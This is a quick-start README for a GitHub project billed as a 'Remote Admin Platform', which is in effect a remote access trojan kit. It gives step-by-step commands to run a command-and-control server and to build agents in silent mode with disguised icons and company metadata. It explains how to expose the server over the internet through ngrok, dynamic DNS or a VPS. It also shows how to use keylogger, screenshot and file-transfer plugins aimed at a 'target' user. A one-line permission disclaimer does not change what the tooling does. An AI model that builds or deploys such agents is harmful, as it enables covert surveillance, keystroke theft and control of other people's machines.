# 🚀 Quick Start Guide

Get up and running with Remote Admin Platform in 5 minutes!

---

## 📋 Prerequisites

```bash
# Check Python version (3.7+ required)
python --version

# Check pip
pip --version
```

---

## ⚡ Installation

```bash
# 1. Clone the repository
git clone https://github.com/palnirupam/remote-admin-platform.git
cd remote-admin-platform

# 2. Create virtual environment
python -m venv venv

# 3. Activate virtual environment
# On Windows:
venv\Scripts\activate
# On Linux/macOS:
source venv/bin/activate

# 4. Install dependencies
pip install -r requirements.txt
```

---

## 🎯 Running the System

### Option 1: Run Tests (Recommended for First Time)

```bash
# Run tests to verify everything works
pytest tests/ -v

# Or run a quick component test
python -c "from remote_system.enhanced_server.auth_module import AuthenticationModule; print('✅ System ready!')"
```

This will verify all components are working correctly.

---

### Option 2: Manual Setup (Full Control)

#### Step 1: Start the Enhanced Server

```bash
# Basic start (localhost, port 9999)
python -m remote_system.enhanced_server.enhanced_server
```

**Advanced options:**
```bash
# With custom configuration
python -m remote_system.enhanced_server.enhanced_server \
    --host 0.0.0.0 \
    --port 9999 \
    --db-path ./data/server.db \
    --log-level INFO
```

The server will:
- ✅ Start listening on port 9999
- ✅ Generate TLS certificates (if not present)
- ✅ Initialize database
- ✅ Wait for agent connections

---

#### Step 2: Build a Custom Agent

Open a **new terminal** and run:

```bash
# Build agent for local network
python remote_system/builder/enhanced_builder.py \
    --server-ip 192.168.1.100 \
    --server-port 9999 \
    --output-dir ./builds

# Build agent with custom icon and metadata
python remote_system/builder/enhanced_builder.py \
    --server-ip 192.168.1.100 \
    --server-port 9999 \
    --icon custom_icon.ico \
    --company "Your Company" \
    --version "1.0.0" \
    --output-dir ./builds

# Build agent in silent mode (no console window)
python remote_system/builder/enhanced_builder.py \
    --server-ip 192.168.1.100 \
    --server-port 9999 \
    --silent \
    --output-dir ./builds
```

**For Internet Deployment:**
```bash
# Using Ngrok
python remote_system/builder/enhanced_builder.py \
    --server-ip https://abc123.ngrok.io \
    --server-port 443

# Using Dynamic DNS
python remote_system/builder/enhanced_builder.py \
    --server-ip myserver.ddns.net \
    --server-port 9999

# Using Public IP
python remote_system/builder/enhanced_builder.py \
    --server-ip 203.0.113.42 \
    --server-port 9999
```

The builder will create:
- ✅ `enhanced_agent.bat` - Batch file to run agent
- ✅ `enhanced_agent.exe` - Standalone executable (if PyInstaller installed)

---

#### Step 3: Run the Agent

```bash
# Run the generated agent
cd builds
python enhanced_agent.py

# Or run the batch file
enhanced_agent.bat

# Or run the executable
enhanced_agent.exe
```

You should see:
```
🤖 Enhanced Agent Starting...
   Connecting to: 192.168.1.100:9999
   TLS: Enabled
   Plugins: 6 loaded
✅ Connected to server!
```

---

#### Step 4: Access the Web UI

Open a **third terminal** and run:

```bash
# Start the REST API server
python -m remote_system.web_ui.rest_api
```

Then open your browser:
```
http://localhost:8080
```

**Default credentials:**
- Username: `admin`
- Password: `admin`

You'll see:
- 📊 Active agents list
- 💻 Command execution interface
- 📸 Screenshot capture
- 📁 File transfer
- 📈 Real-time monitoring

---

## 🧪 Testing

```bash
# Run all tests
pytest tests/ -v

# Run specific test categories
pytest tests/test_integration_e2e.py -v      # Integration tests
pytest tests/test_properties_final.py -v     # Property-based tests
pytest tests/test_performance.py -v          # Performance tests

# Run with coverage
pytest tests/ --cov=remote_system --cov-report=html
```

---

## 📊 Verify Everything is Working

### Check Server Status
```bash
# In the server terminal, you should see:
✅ Server started on 0.0.0.0:9999
✅ TLS enabled
✅ Database initialized
⏳ Waiting for connections...
```

### Check Agent Status
```bash
# In the agent terminal, you should see:
✅ Connected to server
✅ Authenticated successfully
✅ 6 plugins loaded
⏳ Waiting for commands...
```

### Check Web UI
```bash
# In browser at http://localhost:8080
✅ Login page appears
✅ After login, dashboard shows active agents
✅ Can send commands and see results
```

---

## 🎮 Try Some Commands

### Via Web UI:
1. Go to http://localhost:8080
2. Login with admin/admin
3. Select an agent
4. Try these commands:
   - `whoami` - Show current user
   - `hostname` - Show computer name
   - `dir` (Windows) or `ls` (Linux) - List files

### Via REST API:
```bash
# Get list of active agents
curl -u admin:admin http://localhost:8080/api/agents

# Send a command
curl -u admin:admin -X POST http://localhost:8080/api/agents/AGENT_ID/command \
    -H "Content-Type: application/json" \
    -d '{"command": "whoami"}'

# Get command history
curl -u admin:admin http://localhost:8080/api/agents/AGENT_ID/history
```

---

## 🔌 Try Plugin Features

### File Transfer:
```python
# Via Python API
from remote_system.plugins.file_transfer_plugin import FileTransferPlugin

plugin = FileTransferPlugin()
result = plugin.execute(
    action="upload",
    local_path="./test.txt",
    remote_path="C:\\Users\\target\\test.txt"
)
```

### Screenshot:
```python
from remote_system.plugins.screenshot_plugin import ScreenshotPlugin

plugin = ScreenshotPlugin()
result = plugin.execute(
    action="capture",
    quality=85,
    format="PNG"
)
```

### Keylogger:
```python
from remote_system.plugins.keylogger_plugin import KeyloggerPlugin

plugin = KeyloggerPlugin()

# Start logging
plugin.execute(action="start", buffer_size=1000)

# Get logs
logs = plugin.execute(action="get_logs")

# Stop logging
plugin.execute(action="stop")
```

---

## 🌍 Internet Deployment

### Using Ngrok:
```bash
# 1. Install Ngrok: https://ngrok.com/download

# 2. Start Ngrok tunnel
ngrok tcp 9999

# 3. Note the forwarding URL (e.g., tcp://0.tcp.ngrok.io:12345)

# 4. Build agent with Ngrok URL
python remote_system/builder/enhanced_builder.py \
    --server-ip 0.tcp.ngrok.io \
    --server-port 12345
```

### Using Cloud VPS (AWS, Azure, GCP, DigitalOcean):
```bash
# 1. Deploy server on VPS
# 2. Configure firewall to allow port 9999
# 3. Get public IP address
# 4. Build agent with public IP

python remote_system/builder/enhanced_builder.py \
    --server-ip YOUR_VPS_PUBLIC_IP \
    --server-port 9999
```

---

## 🛠️ Troubleshooting

### Server won't start:
```bash
# Check if port is already in use
netstat -an | findstr 9999  # Windows
netstat -an | grep 9999     # Linux/macOS

# Try different port
python -m remote_system.enhanced_server.enhanced_server --port 9998
```

### Agent can't connect:
```bash
# Check firewall
# Windows: Allow Python through Windows Firewall
# Linux: sudo ufw allow 9999

# Check server IP
ping 192.168.1.100

# Check TLS certificates
ls server.crt server.key
```

### Web UI not accessible:
```bash
# Check if REST API is running
curl http://localhost:8080/health

# Try different port
python -m remote_system.web_ui.rest_api --port 8081
```

---

## 📚 Next Steps

Now that everything is working:

1. 📖 Read [USAGE.md](USAGE.md) for detailed usage examples
2. 🔐 Review [SECURITY.md](SECURITY.md) for security best practices
3. 🚀 Check [DEPLOYMENT.md](DEPLOYMENT.md) for production deployment
4. 🔌 Explore [PLUGINS.md](PLUGINS.md) to create custom plugins
5. 📊 See [PERFORMANCE_OPTIMIZATIONS.md](PERFORMANCE_OPTIMIZATIONS.md) for tuning

---

## 🆘 Getting Help

- 📧 **Issues**: [GitHub Issues](https://github.com/palnirupam/remote-admin-platform/issues)
- 📖 **Documentation**: See docs folder
- 💬 **Discussions**: [GitHub Discussions](https://github.com/palnirupam/remote-admin-platform/discussions)

---

## ⚠️ Important Notes

- ✅ Use only on systems you own or have permission to manage
- ✅ Comply with all applicable laws and regulations
- ✅ Change default passwords in production
- ✅ Use strong TLS certificates in production
- ✅ Keep the system updated

---

**🎉 Congratulations! You're now running Remote Admin Platform!**

For more advanced features and configurations, check out the full documentation.
